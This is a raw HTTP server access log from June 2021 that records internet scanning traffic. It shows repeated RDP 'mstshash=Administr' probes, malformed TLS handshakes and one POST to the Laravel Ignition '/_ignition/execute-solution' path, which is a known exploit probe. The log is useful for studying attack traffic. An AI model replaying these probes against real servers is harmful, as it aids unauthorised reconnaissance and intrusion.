47.241.193.60 - - [08/Jun/2021 12:44:28] "[35m[1m [0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [08/Jun/2021 13:26:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 13:26:48] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
74.120.14.56 - - [08/Jun/2021 13:28:11] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.56 - - [08/Jun/2021 13:28:12] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [08/Jun/2021 15:07:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [08/Jun/2021 15:07:49] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 15:27:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 15:27:06] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 16:07:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 16:07:12] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [08/Jun/2021 16:46:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 16:46:48] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
64.62.197.92 - - [08/Jun/2021 16:49:44] "[33mGET / HTTP/1.1[0m" 404 -
89.248.165.10 - - [08/Jun/2021 17:26:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [08/Jun/2021 17:26:31] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [08/Jun/2021 17:40:01] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [08/Jun/2021 17:40:01] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
80.66.88.15 - - [08/Jun/2021 18:25:21] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
80.66.88.15 - - [08/Jun/2021 18:25:21] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [09/Jun/2021 00:00:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [09/Jun/2021 00:00:40] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [09/Jun/2021 00:41:04] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [09/Jun/2021 00:41:04] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [09/Jun/2021 01:21:14] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [09/Jun/2021 01:21:14] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [09/Jun/2021 01:41:33] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [09/Jun/2021 01:41:33] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
89.248.165.10 - - [09/Jun/2021 02:01:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
89.248.165.10 - - [09/Jun/2021 02:01:00] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [09/Jun/2021 02:48:45] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [09/Jun/2021 02:48:45] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [09/Jun/2021 05:18:03] code 400, message Bad request syntax ('\x16\x03\x01\x01"\x01\x00\x01\x1e\x03\x03E\x0b\x10MFXÃ\x9e\x1d\x82\x8dÃ~#\x07\x05Â¤Ã-^Ã\tÃ³ÃN\x835Ã«ÃNXÂ°\x00\x00\x88Ã0Ã,Ã(Ã$Ã\x14Ã')
101.251.200.219 - - [09/Jun/2021 05:18:03] "[35m[1m" EMFXÃÂÂÂÃ~#Â¤Ã-^Ã	Ã³ÃNÂ5Ã«ÃNXÂ°  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [09/Jun/2021 05:18:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01"\x01\x00\x01')
101.251.200.219 - - [09/Jun/2021 05:18:03] "[35m[1m" Â¤<Ãf=D'ÂjÃÃ½Â½ÂÂÃÂ¹hÃ½_Ã±ÃOÃ³"ÂÃxj  ÂÃ0Ã,Ã(Ã$ÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [09/Jun/2021 05:18:03] code 400, message Bad request version ('\x91_\x00\x00PÃ\x14Ã')
101.251.200.219 - - [09/Jun/2021 05:18:03] "[35m[1m Ã  ÃÂ¿ZÃ°Ã½Â¿ÃªÂKC;Â°%iÃÃÂÂÂ½C8?Â¾YÃ¡ÃÂÂ_  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [09/Jun/2021 05:18:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ã\x01\x00\x00Ã\x03\x01ÃÃ"\x8eXW\x83\x02EZdf\x12O\x13Ac')
101.251.200.219 - - [09/Jun/2021 05:18:03] "[35m[1m Ã  ÃÃÃ"ÂXWÂEZdfOAc]ÃÂ²ÃV=Ã¯kÃ Â¡AÃ  PÃÃ[0m" HTTPStatus.BAD_REQUEST -
101.251.200.219 - - [09/Jun/2021 05:18:03] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.39 - - [09/Jun/2021 06:04:59] "[33mGET / HTTP/1.1[0m" 404 -
74.120.14.39 - - [09/Jun/2021 06:05:00] "[33mGET / HTTP/1.1[0m" 404 -
118.126.124.74 - - [09/Jun/2021 07:46:23] "[33mGET / HTTP/1.1[0m" 404 -
39.106.82.211 - - [09/Jun/2021 08:51:33] "[33mPOST /_ignition/execute-solution HTTP/1.1[0m" 404 -
87.251.70.17 - - [09/Jun/2021 09:12:43] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
87.251.70.17 - - [09/Jun/2021 09:12:43] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
45.155.205.209 - - [09/Jun/2021 11:18:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [09/Jun/2021 11:18:06] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
80.249.131.237 - - [09/Jun/2021 12:12:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
80.249.131.237 - - [09/Jun/2021 12:12:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
80.249.131.237 - - [09/Jun/2021 12:12:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
80.249.131.237 - - [09/Jun/2021 12:12:58] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
193.106.29.74 - - [09/Jun/2021 13:02:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
193.106.29.74 - - [09/Jun/2021 13:02:55] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
104.206.128.14 - - [09/Jun/2021 13:09:35] "[33mGET / HTTP/1.1[0m" 404 -
45.155.205.209 - - [09/Jun/2021 13:50:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*Ã \x00\x00\x00\x00\x00Cookie:')
45.155.205.209 - - [09/Jun/2021 13:50:00] "[35m[1m  /*Ã      Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
